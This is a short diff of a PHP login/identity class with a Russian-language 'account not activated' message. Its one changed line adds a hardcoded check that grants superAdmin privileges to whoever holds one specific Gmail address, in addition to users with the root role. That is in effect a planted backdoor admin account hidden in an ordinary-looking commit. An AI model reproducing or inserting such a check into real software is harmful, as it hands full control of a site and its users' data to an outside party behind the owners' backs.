@@ -50,7 +50,7 @@ class UserIdentity extends X3_User{
             return X3::translate(X3::translate('Ваш аккаунт не активирован'));
         $this->id = $user->id;
         $this->fullname = $user->name." ".$user->surname;
-        if($user->role == 'root'){
+        if($user->role == 'root' || $user->email == 'soulman.is.good@gmail.com'){
             $this->superAdmin = true;
         }
         $this->role = $user->role;
